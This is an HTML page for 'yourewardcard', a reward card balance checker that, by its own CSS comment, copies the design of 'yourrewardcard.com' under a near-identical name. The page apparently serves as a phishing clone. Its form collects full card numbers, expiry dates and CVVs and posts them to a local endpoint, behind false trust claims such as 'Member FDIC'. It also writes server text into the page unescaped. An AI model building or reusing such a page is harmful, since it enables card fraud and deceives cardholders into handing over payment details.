<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description" content="yourewardcard - Check your Visa and Mastercard reward card balance securely online. Free reward card balance checker.">
  <meta name="keywords" content="yourewardcard, reward card balance, check balance, Visa reward card, Mastercard reward card, prepaid card balance">
  <meta name="robots" content="index, follow">
  <meta property="og:title" content="yourewardcard - Reward Card Balance Checker">
  <meta property="og:description" content="yourewardcard - Check your reward card balance securely. Visa and Mastercard supported.">
  <meta property="og:type" content="website">
  <link rel="icon" type="image/svg+xml" href="/favicon.svg">
  <title>yourewardcard - Reward Card Balance Checker</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
  <style>
    /* Same design as main site – reward card style (yourrewardcard.com style) */
    :root {
      --primary: #002855;
      --primary-hover: #003366;
      --accent: #0066cc;
      --bg: #e8eef4;
      --white: #fff;
      --text: #1a1f36;
      --text-muted: #4a5568;
      --border: #c5d0de;
      --success: #0d7d4a;
      --error: #c53030;
      --font: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
      --radius: 6px;
      --btn-radius: 6px;
      --shadow: 0 2px 8px rgba(0,40,85,.08);
      --shadow-card: 0 4px 20px rgba(0,40,85,.12);
    }
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: var(--font); background: var(--bg); color: var(--text); min-height: 100vh; line-height: 1.5; }
    .app { min-height: 100vh; display: flex; flex-direction: column; }
    .header {
      background: var(--primary);
      color: var(--white);
      box-shadow: 0 2px 4px rgba(0,0,0,.2);
    }
    .header-inner {
      max-width: 1140px;
      margin: 0 auto;
      padding: 1rem 1.5rem;
      display: flex;
      align-items: center;
      justify-content: space-between;
    }
    .bank-logo { display: flex; align-items: center; gap: 0.6rem; text-decoration: none; color: var(--white); }
    .bank-logo .icon {
      width: 40px; height: 40px;
      background: rgba(255,255,255,.2);
      border-radius: var(--radius);
      display: flex; align-items: center; justify-content: center;
      color: var(--white); font-weight: 700; font-size: 1rem;
    }
    .bank-logo .name { font-size: 1.35rem; font-weight: 700; letter-spacing: -0.02em; }
    .secure-badge { display: flex; align-items: center; gap: 0.5rem; font-size: 0.8125rem; color: rgba(255,255,255,.9); }
    .secure-badge svg { width: 16px; height: 16px; }
    .main { flex: 1; padding: 2.5rem 1.5rem 3rem; max-width: 1140px; margin: 0 auto; width: 100%; }
    .hero { text-align: center; margin-bottom: 2rem; }
    .hero h1 { font-size: 1.75rem; font-weight: 700; color: var(--primary); margin-bottom: 0.5rem; }
    .hero p { color: var(--text-muted); font-size: 1rem; }
    .content-grid { display: grid; gap: 2rem; align-items: start; }
    @media (min-width: 900px) { .content-grid { grid-template-columns: 1fr 300px; gap: 2.5rem; } }
    .form-section { display: flex; justify-content: center; }
    .card-form {
      background: var(--white);
      border: 1px solid var(--border);
      border-radius: 8px;
      padding: 2rem;
      width: 100%;
      max-width: 420px;
      box-shadow: var(--shadow-card);
    }
    .form-title { font-size: 0.75rem; font-weight: 600; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.06em; margin-bottom: 1.25rem; }
    .form-group { margin-bottom: 1.25rem; }
    .form-group label { display: block; font-size: 0.8125rem; font-weight: 600; color: var(--text); margin-bottom: 0.5rem; }
    .form-group input { width: 100%; padding: 0.75rem 1rem; font-size: 1rem; border: 1px solid var(--border); border-radius: var(--radius); background: var(--white); }
    .form-group input:focus { outline: 0; border-color: var(--accent); box-shadow: 0 0 0 3px rgba(0,102,204,.2); }
    .form-group input.error { border-color: var(--error); }
    .form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
    .expiry-inputs { display: flex; align-items: center; gap: 0.5rem; }
    .expiry-inputs input { flex: 1; text-align: center; }
    .expiry-sep { color: var(--text-muted); font-weight: 600; }
    .field-error { font-size: 0.75rem; color: var(--error); margin-top: 0.25rem; }
    .btn {
      padding: 0.9rem 1.5rem; font-size: 1rem; font-weight: 600; border: none; border-radius: var(--btn-radius);
      cursor: pointer; width: 100%; margin-top: 0.5rem; display: flex; align-items: center; justify-content: center; gap: 0.5rem;
      background: var(--primary); color: var(--white); transition: background 0.2s;
    }
    .btn:hover:not(:disabled) { background: var(--primary-hover); }
    .btn:disabled { opacity: 0.7; cursor: not-allowed; }
    .spinner { width: 18px; height: 18px; border: 2px solid rgba(255,255,255,.3); border-top-color: currentColor; border-radius: 50%; animation: spin 0.8s linear infinite; }
    @keyframes spin { to { transform: rotate(360deg); } }
    .balance-result { margin-top: 1.5rem; padding: 1.5rem; border-radius: var(--radius); text-align: center; display: none; }
    .balance-result.show { display: block; }
    .balance-result.success { background: #e6f7ee; border: 1px solid #9dd4b8; }
    .balance-result.error { background: #fde8e8; border: 1px solid #f4a0a0; }
    .result-icon { width: 48px; height: 48px; margin: 0 auto 1rem; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 1.25rem; font-weight: 700; }
    .balance-result.success .result-icon { background: var(--success); color: white; }
    .balance-result.error .result-icon { background: var(--error); color: white; }
    .balance-result h2 { font-size: 1.125rem; margin-bottom: 0.75rem; color: var(--text); }
    .balance-amount { display: flex; align-items: baseline; justify-content: center; gap: 0.5rem; margin-bottom: 0.5rem; }
    .balance-amount .currency { font-size: 1rem; color: var(--text-muted); }
    .balance-amount .amount { font-size: 2rem; font-weight: 700; color: var(--success); }
    .card-info { font-size: 0.875rem; color: var(--text-muted); }
    .error-message { font-size: 0.9375rem; color: var(--error); }
    .trust-panel { background: var(--white); border: 1px solid var(--border); border-radius: 8px; padding: 1.5rem; box-shadow: var(--shadow); }
    .trust-panel h3 { font-size: 1rem; font-weight: 600; color: var(--primary); margin-bottom: 1rem; }
    .trust-item { display: flex; gap: 0.75rem; margin-bottom: 1rem; }
    .trust-item:last-child { margin-bottom: 0; }
    .trust-item .icon { color: var(--accent); font-weight: 700; flex-shrink: 0; }
    .trust-item h4 { font-size: 0.9375rem; margin-bottom: 0.25rem; }
    .trust-item p { font-size: 0.8125rem; color: var(--text-muted); }
    .footer {
      padding: 2rem 1.5rem; text-align: center; background: var(--primary); color: var(--white); margin-top: auto;
    }
    .footer-logos { display: flex; gap: 1.5rem; justify-content: center; margin-bottom: 0.75rem; }
    .footer-logos span { font-size: 0.875rem; font-weight: 600; color: rgba(255,255,255,.95); }
    .footer p { font-size: 0.75rem; opacity: 0.9; }
    .btn-secondary { background: var(--white); color: var(--primary); border: 2px solid var(--primary); margin-top: 1rem; border-radius: var(--btn-radius); }
    .btn-secondary:hover:not(:disabled) { background: #f0f4f8; }
    #checkAnother { display: none; }
    #checkAnother.show { display: flex; }
    #formFields.hide { display: none; }
    .cookie-bar {
      position: fixed;
      bottom: 0;
      left: 0;
      right: 0;
      background: var(--primary);
      color: var(--white);
      padding: 1rem 1.5rem;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 1rem;
      flex-wrap: wrap;
      box-shadow: 0 -2px 12px rgba(0,0,0,0.15);
      z-index: 10000;
      font-size: 0.875rem;
    }
    .cookie-bar.hide { display: none; }
    .cookie-bar p { margin: 0; flex: 1; min-width: 200px; }
    .cookie-bar .btn-accept {
      padding: 0.5rem 1.25rem;
      font-size: 0.875rem;
      font-weight: 600;
      background: var(--white);
      color: var(--primary);
      border: none;
      border-radius: 6px;
      cursor: pointer;
      white-space: nowrap;
    }
    .cookie-bar .btn-accept:hover { opacity: 0.95; }
  </style>
</head>
<body>
  <div class="app">
    <header class="header">
      <div class="header-inner">
        <div class="bank-logo">
          <div class="icon">◆</div>
          <span class="name" id="bankName">yourewardcard</span>
        </div>
        <div class="secure-badge">
          <svg fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd"/></svg>
          Secure Connection
        </div>
      </div>
    </header>
    <main class="main">
      <section class="hero">
        <h1>yourewardcard</h1>
        <p>Check your reward card balance securely</p>
      </section>
      <div class="content-grid">
        <div class="form-section">
          <div class="card-form">
            <div class="form-title">Card Information</div>
            <form id="balanceForm">
              <div id="formFields">
                <div class="form-group">
                  <label for="cardNumber">Card Number</label>
                  <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="23" inputmode="numeric" autocomplete="cc-number">
                  <span class="field-error" id="cardError"></span>
                </div>
                <div class="form-row">
                  <div class="form-group">
                    <label for="expiryMonth">Expiration Date</label>
                    <div class="expiry-inputs">
                      <input type="text" id="expiryMonth" placeholder="MM" maxlength="2" inputmode="numeric">
                      <span class="expiry-sep">/</span>
                      <input type="text" id="expiryYear" placeholder="YY" maxlength="2" inputmode="numeric">
                    </div>
                    <span class="field-error" id="expiryError"></span>
                  </div>
                  <div class="form-group">
                    <label for="cvv">Security Code (CVV)</label>
                    <input type="password" id="cvv" placeholder="•••" maxlength="4" inputmode="numeric" autocomplete="cc-csc" title="3-digit code on the back of your card">
                    <span class="field-error" id="cvvError"></span>
                  </div>
                </div>
                <button type="submit" class="btn" id="submitBtn">Check Balance</button>
              </div>
              <button type="button" class="btn btn-secondary" id="checkAnother">Check Another Card</button>
            </form>
            <div id="result" class="balance-result"></div>
          </div>
        </div>
        <aside class="trust-panel">
          <h3>Why check with us</h3>
          <div class="trust-item">
            <span class="icon">✓</span>
            <div>
              <h4>Secure & Encrypted</h4>
              <p>Your information is protected with bank-level security.</p>
            </div>
          </div>
          <div class="trust-item">
            <span class="icon">✓</span>
            <div>
              <h4>Visa & Mastercard</h4>
              <p>Accepted at millions of locations worldwide.</p>
            </div>
          </div>
          <div class="trust-item">
            <span class="icon">✓</span>
            <div>
              <h4>Available 24/7</h4>
              <p>Check your balance anytime, anywhere.</p>
            </div>
          </div>
        </aside>
      </div>
    </main>
    <footer class="footer">
      <div class="footer-logos">
        <span>Visa</span>
        <span>Mastercard</span>
      </div>
      <p>Member FDIC • Your card is protected</p>
    </footer>
  </div>
  <div class="cookie-bar" id="cookieBar">
    <p>We use cookies to improve your experience and keep this site secure. By continuing, you accept our use of cookies.</p>
    <button type="button" class="btn-accept" id="cookieAccept">Accept</button>
  </div>
  <script>
    const cardInput = document.getElementById('cardNumber');
    const expiryMonth = document.getElementById('expiryMonth');
    const expiryYear = document.getElementById('expiryYear');
    const cvvInput = document.getElementById('cvv');
    const form = document.getElementById('balanceForm');
    const resultEl = document.getElementById('result');
    const submitBtn = document.getElementById('submitBtn');
    const formFields = document.getElementById('formFields');
    const checkAnother = document.getElementById('checkAnother');

    cardInput.addEventListener('input', e => {
      let v = e.target.value.replace(/\D/g, '').slice(0, 19);
      e.target.value = v.replace(/(\d{4})(?=\d)/g, '$1 ');
      e.target.classList.remove('error');
    });
    expiryMonth.addEventListener('input', e => {
      e.target.value = e.target.value.replace(/\D/g, '').slice(0, 2);
      e.target.classList.remove('error');
    });
    expiryYear.addEventListener('input', e => {
      e.target.value = e.target.value.replace(/\D/g, '').slice(0, 2);
      e.target.classList.remove('error');
    });
    cvvInput.addEventListener('input', e => {
      e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
      e.target.classList.remove('error');
    });

    (function() {
      try {
        if (localStorage.getItem('yourewardcard_cookies') === 'accepted') {
          document.getElementById('cookieBar').classList.add('hide');
          return;
        }
        document.getElementById('cookieAccept').onclick = function() {
          localStorage.setItem('yourewardcard_cookies', 'accepted');
          document.getElementById('cookieBar').classList.add('hide');
        };
      } catch (e) {}
    })();

    function validate() {
      const digits = cardInput.value.replace(/\s/g, '');
      let ok = true;
      document.querySelectorAll('.field-error').forEach(el => el.textContent = '');
      document.querySelectorAll('.form-group input').forEach(el => el.classList.remove('error'));

      if (digits.length < 15 || digits.length > 19) {
        document.getElementById('cardError').textContent = 'Please enter a valid 16-digit card number';
        cardInput.classList.add('error');
        ok = false;
      }
      const mm = parseInt(expiryMonth.value, 10);
      if (!expiryMonth.value || expiryMonth.value.length !== 2 || mm < 1 || mm > 12) {
        document.getElementById('expiryError').textContent = 'Valid MM/YY required';
        expiryMonth.classList.add('error');
        ok = false;
      }
      if (!expiryYear.value || expiryYear.value.length !== 2) {
        document.getElementById('expiryError').textContent = 'Valid MM/YY required';
        expiryYear.classList.add('error');
        ok = false;
      }
      if (!cvvInput.value || cvvInput.value.length < 3) {
        document.getElementById('cvvError').textContent = 'Enter 3 or 4 digit security code';
        cvvInput.classList.add('error');
        ok = false;
      }
      return ok;
    }

    function showResult(data) {
      resultEl.className = 'balance-result show ' + (data.success ? 'success' : 'error');
      if (data.success) {
        resultEl.innerHTML = `
          <div class="result-icon">✓</div>
          <h2>Available Balance</h2>
          <div class="balance-amount">
            <span class="currency">${data.currency || 'USD'}</span>
            <span class="amount">${typeof data.balance === 'number' ? data.balance.toFixed(2) : data.balance}</span>
          </div>
          ${data.cardLast4 ? '<p class="card-info">Card ending in •••• ' + data.cardLast4 + '</p>' : ''}
        `;
      } else {
        resultEl.innerHTML = `
          <div class="result-icon">!</div>
          <h2>Unable to Check Balance</h2>
          <p class="error-message">${data.error || 'Please verify your card details and try again.'}</p>
        `;
      }
      formFields.classList.add('hide');
      checkAnother.classList.add('show');
      resultEl.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
    }

    checkAnother.addEventListener('click', () => {
      resultEl.className = 'balance-result';
      resultEl.innerHTML = '';
      formFields.classList.remove('hide');
      checkAnother.classList.remove('show');
      form.reset();
    });

    form.addEventListener('submit', async e => {
      e.preventDefault();
      if (!validate()) return;

      const digits = cardInput.value.replace(/\s/g, '');

      submitBtn.disabled = true;
      submitBtn.innerHTML = '<span class="spinner"></span> Checking...';

      try {
        const res = await fetch('/api/check-balance', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            cardNumber: cardInput.value.trim(),
            expiryMonth: expiryMonth.value,
            expiryYear: expiryYear.value,
            cvv: cvvInput.value
          })
        });
        const data = await res.json();

        // Map API response to our format (API may return balance, message, etc.)
        let result = data;
        if (data.balance !== undefined || data.amount !== undefined) {
          result = {
            success: true,
            balance: data.balance ?? data.amount ?? 0,
            currency: data.currency || 'USD',
            cardLast4: digits.slice(-4),
            error: data.error || data.message
          };
        } else if (data.error || data.message) {
          result = { success: false, error: data.error || data.message };
        } else if (!result.success && !result.error) {
          result.error = data.raw || 'Unable to check balance. Please try again.';
        }
        showResult(result);
      } catch (err) {
        showResult({ success: false, error: 'Connection failed. Make sure the server is running.' });
      }

      submitBtn.disabled = false;
      submitBtn.innerHTML = 'Check Balance';
    });
  </script>
</body>
</html>
